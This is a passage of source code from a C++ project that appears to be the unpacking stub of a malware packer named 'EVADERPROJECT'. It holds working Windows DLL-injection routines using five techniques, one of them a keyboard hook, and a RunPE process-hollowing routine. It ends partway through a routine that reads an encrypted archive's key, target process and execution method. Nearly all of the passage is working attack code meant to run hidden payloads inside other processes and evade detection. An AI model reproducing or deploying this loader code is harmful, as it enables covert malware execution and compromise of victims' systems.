  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="src\Execution\CreateRemoteThread.cpp" />
    <ClCompile Include="src\Execution\Execution.cpp" />
    <ClCompile Include="src\Execution\NtCreateThreadEx.cpp" />
    <ClCompile Include="src\Execution\QueueUserAPC.cpp" />
    <ClCompile Include="src\Execution\RtlCreateUserThread.cpp" />
    <ClCompile Include="src\Execution\SetWindowsHookEx.cpp" />
    <ClCompile Include="src\Stub\PackRoutines-Stub.cpp" />
    <ClCompile Include="src\Execution\RunPE.cpp" />
    <ClCompile Include="src\Stub\UnpackStub.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\Execution\Execution.h" />
    <ClInclude Include="src\Stub\PackRoutines-Stub.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`UnpackStub/UnpackStub.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\Execution\Execution.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Execution\CreateRemoteThread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Execution\NtCreateThreadEx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Execution\QueueUserAPC.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Execution\SetWindowsHookEx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Execution\RtlCreateUserThread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Execution\RunPE.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Stub\UnpackStub.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\Stub\PackRoutines-Stub.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\Execution\Execution.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="src\Stub\PackRoutines-Stub.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`UnpackStub/UnpackStub.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>true</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`UnpackStub/src/Execution/CreateRemoteThread.cpp`:

```cpp
#include "Execution.h"

bool CreateRemoteThread_Type1(LPCSTR DllPath, HANDLE hProcess) {

	LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibAddr) {
		printf("Could note locate real address of LoadLibraryA!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);

	BOOL Written = WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath), NULL);

	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, pDllPath, 0, NULL);

	if (!hThread) {
		printf("Could not open Thread with CreatRemoteThread API\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Thread started with CreateRemoteThread\n");
	Sleep(1000);

	WaitForSingleObject(hThread, INFINITE);
	system("PAUSE");

	if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
		//VirtualFreeEx(hProc, reinterpret_cast<int*>(pDllPath) + 0X010000, 0, MEM_RELEASE);
		printf("Memory was freed in target process\n");
		Sleep(1000);
	}

	CloseHandle(hThread);

	return true;
}
```

`UnpackStub/src/Execution/Execution.cpp`:

```cpp
#include "Execution.h"
/*
#ifdef _WIN64
LPCSTR DllPath = "C:\\Users\\k.rajabzadeh\\source\\repos\\Windows-DLL-Injector\\PayloadDLLBuild\\bin\\Debug\\x64\\PayloadDLL.dll";
//LPCSTR DllPath = "C:\\Users\\kourosh\\source\\repos\\WindowsIATHooking\\IATHookingBuild\\bin\\Debug\\x64\\WindowsIATHooking.dll";
#else
LPCSTR DllPath = "C:\\Users\\k.rajabzadeh\\source\\repos\\Windows-DLL-Injector\\PayloadDLLBuild\\bin\\Debug\\Win32\\PayloadDLL.dll";
//LPCSTR DllPath = "C:\\Users\\kourosh\\source\\repos\\WindowsIATHooking\\IATHookingBuild\\bin\\Debug\\Win32\\WindowsIATHooking.dll";
#endif
*/

// variables for Privilege Escalation
HANDLE hToken;
int dwRetVal = RTN_OK;

int initializeInjection(char * targetProgram, LPCSTR DllPath, int InjectionMethod) {

	/*
	printf("escalating Privileges...\n");
	Sleep(2000);
	int epResult = EscalatePrivilege();
	printf("Result of Privilege Escalation : %d\n", epResult);

	if (epResult == RTN_OK)
		printf("Successfully Escalated privileges to SYSTEM level...\n");
	*/


	char szProc[80];
	strcpy(szProc, targetProgram);

	PROCESSENTRY32 PE32{ sizeof(PROCESSENTRY32) };
	PE32.dwSize = sizeof(PE32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed!");
		printf("LastError : 0x%x\n", GetLastError());
		system("PAUSE");
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);
	char yn[3];

	while (bRet) {

		//printf("process: %s\n", PE32.szExeFile);
		if (!strcmp((LPCSTR)szProc, PE32.szExeFile)) {

			PID = PE32.th32ProcessID;
			printf("PID found for this process name ---> %d\n", PID);
			printf("Is this OK ? [Input Y to continue with this PID] : ");


			scanf_s("%2s", yn, 2);

			if (!strcmp((LPCSTR)yn, "y") || !strcmp((LPCSTR)yn, "Y"))
				break;

			printf("\n\n");

		}

		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	printf("Target Program PID: %d\n\n", PID);


	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, PID
	);

	//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (!hProcess) {
		printf("Could not open Process for PID %d\n", PID);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	// disable SeDebugPrivilege
	/*SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);*/

	// close handles
	CloseHandle(hToken);

	switch (InjectionMethod)
	{
	case 1:
		CreateRemoteThread_Type1(DllPath, hProcess);
		break;
	case 2:
		NtCreateThreadEx_Type2(DllPath, hProcess);
		break;
	case 3:
		QueueUserAPC_Type3(DllPath, hProcess, PID);
		break;
	case 4:
		SetWindowsHookEx_type4(PID, DllPath);
		break;
	case 5:
		RtlCreateUsreThread_type5(hProcess, DllPath);
		break;
	default:
		printf("Choose a valid mathod\n");
		break;
	}


	CloseHandle(hProcess);

	/*if (!TerminateProcess(hProcess, 0xffffffff))
	{
		DisplayError("TerminateProcess");
		dwRetVal = RTN_ERROR;
	}*/

	return 0;
}
```

`UnpackStub/src/Execution/Execution.h`:

```h
#pragma once

#ifndef INJECTOR_H
#define INJECOTR_H


#define RTN_OK		0
#define RTN_USAGE	1
#define RTN_ERROR	13

#include <stdio.h>
#include <Windows.h>
#include <tlHelp32.h>


#define DEBUG_NTBUFFER

// bool GetOSInfo();

// Escalate Privilege to SYSTEM level
// bool SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege);
// void DisplayError(LPCSTR szAPI);
// int EscalatePrivilege();

int initializeInjection(char * targetProgram, LPCSTR DllPath, int InjectionMethod = -1);

//int RunImage(HANDLE Image);

// tech 0 ---> Run PE
int RunPortableExecutable(HANDLE Image);

// tech 1 ---> CreateRemoteThread
bool CreateRemoteThread_Type1(LPCSTR DllPath, HANDLE hProcess);


// tech 2 ---> NtCreateThreadEx
bool NtCreateThreadEx_Type2(LPCSTR DllPath, HANDLE hProcess);

#ifdef DEBUG_NTBUFFER


// Unknown buffer structuew definition in NtCreateThread API
struct NtCreateThreadExBuffer
{
	SIZE_T	Size;
	SIZE_T	Unknown1;
	SIZE_T	Unknown2;
	PULONG	Unknown3;
	SIZE_T	Unknown4;
	SIZE_T	Unknown5;
	SIZE_T	Unknown6;
	PULONG	Unknown7;
	SIZE_T	Unknown8;
};

#endif


// NtCreateThreadEx header definition based on https://undocumented.ntinternals.net/
typedef NTSTATUS(WINAPI* lpNtCreateThreadEx)(

	OUT		PHANDLE				hThread,
	IN		ACCESS_MASK			DesiredAccess,
	IN		LPVOID				ObjectAttributes,
	IN		HANDLE				ProcessHandle,
	IN		LPVOID				lpStartAddress,
	IN		LPVOID				lpParameter,
	IN		ULONG				CreateSuspended,
	IN		SIZE_T				StackZeroBits,
	IN		SIZE_T				SizeOfStackCommit,
	IN		SIZE_T				SizeOfStackReserve,
	OUT		LPVOID				lpBytesBuffer
	);


// tech 3 ---> QueueUserAPC
bool QueueUserAPC_Type3(LPCSTR DllPath, HANDLE hProcess, DWORD processId);


// tech 4 ---> SetWindowsHookEx
bool SetWindowsHookEx_type4(DWORD processId, LPCSTR dllPath);


// tech 5 ---> RtlCreatUserThread
bool RtlCreateUsreThread_type5(HANDLE hProcess, LPCSTR DllPath);


// RtlCreateUserThread header definition based on https://undocumented.ntinternals.net/
typedef DWORD(WINAPI* pRtlCreatUserThread)(

	IN		HANDLE					ProcessHandle,
	IN 		PSECURITY_DESCRIPTOR	SecurityDescriptor,
	IN		BOOLEAN					CreateSuspended,
	IN		ULONG					StackZeroBits,
	IN OUT	PULONG					StackReserved,
	IN OUT	PULONG					StackCommit,
	IN		PVOID					StartAddress,
	IN		PVOID					StartParameter,
	OUT		PHANDLE					ThreadHandle,
	OUT		PVOID					ClientID

	);

#endif
```

`UnpackStub/src/Execution/NtCreateThreadEx.cpp`:

```cpp
#include "Execution.h"

bool NtCreateThreadEx_Type2(LPCSTR DllPath, HANDLE hProcess) {


	LPVOID LoadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibraryAddr) {
		printf("Could note get real address of LoadLibraryA from kernel32.dll!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibraryAddr);
	Sleep(1000);
	//system("PAUSE");


	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);
	//system("PAUSE");


	BOOL Written = WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath), NULL);


	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);
	//system("PAUSE");

	HMODULE modNtDll = GetModuleHandle("ntdll.dll");

	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	lpNtCreateThreadEx funNtCreateThreadEx = (lpNtCreateThreadEx)GetProcAddress(modNtDll, "NtCreateThreadEx");

	if (!funNtCreateThreadEx) {
		printf("Failed to get NtCreateThreadEx function address from ntdll.dll\n");
		printf("LastError: 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

#ifdef DEBUG_NTBUFFER

	NtCreateThreadExBuffer ntBuffer;

	memset(&ntBuffer, 0, sizeof(NtCreateThreadExBuffer));
	ULONG temp0[2];
	ULONG temp1;

	ntBuffer.Size = sizeof(NtCreateThreadExBuffer);
	ntBuffer.Unknown1 = 0x10003;
	ntBuffer.Unknown2 = sizeof(temp0);
	ntBuffer.Unknown3 = temp0;
	ntBuffer.Unknown4 = 0;
	ntBuffer.Unknown5 = 0x10004;
	ntBuffer.Unknown6 = sizeof(temp1);
	ntBuffer.Unknown7 = &temp1;
	ntBuffer.Unknown8 = 0;
#endif

	HANDLE hThread = nullptr;

	NTSTATUS status = funNtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		hProcess,
		(LPTHREAD_START_ROUTINE)LoadLibraryAddr,
		pDllPath,
		NULL, //start instantly
		0,
		0,
		0,
		nullptr
	);

	if (!hThread) {
		printf("\nNtCreateThreadEx failed\n");
		printf("LastError: 0X%x\n", GetLastError());
		if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
			//VirtualFreeEx(hProc, reinterpret_cast<int*>(pDllPath) + 0X010000, 0, MEM_RELEASE);
			printf("Memory was freed in target process\n");
			Sleep(1000);
		}
		system("PAUSE");
		return false;
	}

	printf("Thread started with NtCreateThread\n");
	Sleep(1000);

	WaitForSingleObject(hThread, INFINITE);

	system("PAUSE");

	if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
		printf("Memory was freed in target process\n");
		Sleep(1000);
	}

	CloseHandle(hThread);

	CloseHandle(hProcess);

	return true;
}
```

`UnpackStub/src/Execution/QueueUserAPC.cpp`:

```cpp
#include "Execution.h"

bool QueueUserAPC_Type3(LPCSTR DllPath, HANDLE hProcess, DWORD processId) {

	LPVOID LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibAddr) {
		printf("Could note locate real address of LoadLibraryA!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);


	BOOL Written = WriteProcessMemory(hProcess, pDllPath, LPVOID(DllPath), strlen(DllPath), NULL);

	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take snaphsot of all running threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		printf("Could not get snapshot of threads\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	// set structure size
	te32.dwSize = sizeof(THREADENTRY32);
	DWORD threadId;

	if (!Thread32First(hThreadSnap, &te32)) {
		printf("Could not get first thread\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	do {

		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			printf("Exploitng thread with ID %d", threadId);
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);

			if (hThread) {

				printf("Thread %d is opened succesfully\n", threadId);
				Sleep(1000);
				DWORD dwResult = QueueUserAPC((PAPCFUNC)LoadLibAddr, hThread, (ULONG_PTR)pDllPath);

				if (dwResult) {
					printf("Payload Injected successfully in thread %d\n", threadId);
					system("PAUSE");
					return true;
				}
				else
				{
					printf("Error in calling QueueUSerAPC() for thread %d!... Continuing to try other threads\n", threadId);
					system("PAUSE");
				}

			}
			else {
				printf("Error in Getting found thread ID\n");
				printf("LastError : 0X%x\n", GetLastError());
				system("PAUSE");
				return false;
			}
		}

	} while (Thread32Next(hThreadSnap, &te32));

	if (!threadId)
		printf("No Thread for use in process %d\n", processId);

	CloseHandle(hThreadSnap);

	return false;

}
```

`UnpackStub/src/Execution/RtlCreateUserThread.cpp`:

```cpp
#include "Execution.h"

bool RtlCreateUsreThread_type5(HANDLE hProcess, LPCSTR DllPath) {

	LPVOID LoadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibraryAddr) {
		printf("Could note get real address of LoadLibraryA from kernel32.dll!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibraryAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);

	BOOL written = WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath), NULL);

	if (!written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HMODULE modNtDll = GetModuleHandle("ntdll.dll");

	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	pRtlCreatUserThread pfunc_RtlCreateUserThread = (pRtlCreatUserThread)GetProcAddress(modNtDll, "RtlCreateUserThread");

	if (!pfunc_RtlCreateUserThread) {
		printf("Failed to get RtlCreateThreadEx function address from ntdll.dll\n");
		printf("LastError: 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	HANDLE hThread = NULL;

	pfunc_RtlCreateUserThread(
		hProcess,
		NULL,
		0,
		0,
		0,
		0,
		LoadLibraryAddr,
		pDllPath,
		&hThread,
		NULL
	);

	if (!hThread) {

		printf("\nRtlCreateUserThreadEx failed\n");
		printf("LastError: 0X%x\n", GetLastError());

		if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
			printf("Memory was freed in target process\n");
			Sleep(1000);
		}
		system("PAUSE");
		return false;
	}

	printf("Thread started with RtlCreateUserThread\n");
	Sleep(1000);

	WaitForSingleObject(hThread, INFINITE);

	system("PAUSE");

	if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
		//VirtualFreeEx(hProc, reinterpret_cast<int*>(pDllPath) + 0X010000, 0, MEM_RELEASE);
		printf("Memory was freed in target process\n");
		Sleep(1000);
	}

	CloseHandle(hThread);

	CloseHandle(hProcess);

	return true;
}
```

`UnpackStub/src/Execution/RunPE.cpp`:

```cpp
#include "Execution.h"

int RunPortableExecutable(HANDLE Image) {

	PIMAGE_DOS_HEADER DOSHeader;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_SECTION_HEADER SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFO SI;

	PCONTEXT CTX;

	PSIZE_T ImageBase;
	PVOID pImageBase;

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(SIZE_T(Image) + DOSHeader->e_lfanew);

	GetModuleFileName(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

			CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {

#ifdef _WIN64
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Rbx + 8), LPVOID(&ImageBase), 4, 0);
#else
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
#endif	

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {

					SectionHeader = PIMAGE_SECTION_HEADER(SIZE_T(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(SIZE_T(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(SIZE_T(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);

				}
#ifdef _WIN64
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rbx + 8),
#else
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
#endif

					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

#ifdef _WIN64
				CTX->Rax = SIZE_T(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#else
				CTX->Eax = SIZE_T(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

				SetThreadContext(PI.hThread, LPCONTEXT(CTX));

				ResumeThread(PI.hThread);

				return 0;
			}

			return -1;

		}

		return -1;

	}

	return -1;

}
```

`UnpackStub/src/Execution/SetWindowsHookEx.cpp`:

```cpp
#include "Execution.h"

bool SetWindowsHookEx_type4(DWORD processId, LPCSTR dllPath) {

	HMODULE hModDll = LoadLibrary(dllPath);

	if (!hModDll) {
		printf("Error in getting module handle for %s\n", dllPath);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	HOOKPROC procAddress = (HOOKPROC)GetProcAddress(hModDll, "HookProcedure");

	if (!procAddress) {
		printf("Error in getting hook procedure address in %s\n", dllPath);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take snaphsot of all running threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		printf("Could not get snapshot of threads\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	// set structure size
	te32.dwSize = sizeof(THREADENTRY32);
	DWORD threadId = 0;

	if (!Thread32First(hThreadSnap, &te32)) {
		printf("Could not get first thread\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	/*
	HWND hwnd = nullptr;
	hwnd = FindWindowA(NULL, "C:\\Users\\kourosh\\source\\repos\\WindowsDLLInjector\\TargetProgramBuild\\bin\\x64\\Debug\\TargetProgram.exe");
	GetWindowThreadProcessId(hwnd, &processId);

	if (!hwnd) {
		printf("Could not find window\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}
	*/
	
	do {

		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			printf("%d", threadId);
			HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te32.th32ThreadID);

			if (hThread) {


				printf("Setting hook in thread with ID %d\n", threadId);
				HHOOK hookHandle = SetWindowsHookExA(WH_KEYBOARD, procAddress, hModDll, (DWORD)threadId);

				if (!hookHandle) {
					printf("Error in Setting Hook in thread\n");
					printf("LastError : 0X%x\n", GetLastError());
					system("PAUSE");
					return false;
				}
				else
				{
					printf("Hook Installed successfully via SetWindowsHookEx in process %d\n", processId);
					system("PAUSE");
					UnhookWindowsHookEx(hookHandle);
					return true;
				}
			}
			else {
				printf("Could not find suitable Thread\n");
				system("PAUSE");
			}
				

		}

	} while (Thread32Next(hThreadSnap, &te32));

	if (!threadId)
		printf("No Thread for use in process %d\n", processId);

	return false;


}
```

`UnpackStub/src/Stub/PackRoutines-Stub.cpp`:

```cpp
#include "PackRoutines-Stub.h"
#include "../Execution//Execution.h"

const char* packerrors_str[] = {
	"Success",
	"Archive empty; no files to extract",
	"Error in supplied Path",
	"Could not create output archive file",
	"Not a valid packed file",
	"Failed while extracting one of the files",
	"Input archive file failed to open"
};

char* key;
char mainsignature[] = "EVADERPROJECT";

int KEY_SIZE;
int START_ASCII;
int END_ASCII;


int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {
	return unpackfilesEx(archive, dest, filesList, startPos, pcb);
}

int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {

	FILE* fpArchive = fopen(archive, "rb");

	if (!fpArchive) return packerrorCouldNotOpenArchive;

	char SIG[13];
	SIZE_T nFiles;

	char TargetProgram[80];
	int exeMethod;

	if (startPos)
		fseek(fpArchive, startPos, SEEK_SET);

	// read key length and complexcity
	fread(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
	fread(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
	fread(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
	key = new char[KEY_SIZE]();


	// read signature
	fread(SIG, sizeof(char), sizeof(SIG), fpArchive);


	// read execution method
	fread(&exeMethod, sizeof(int), 1, fpArchive);

	// read targetprogram name
	if (exeMethod != 0)
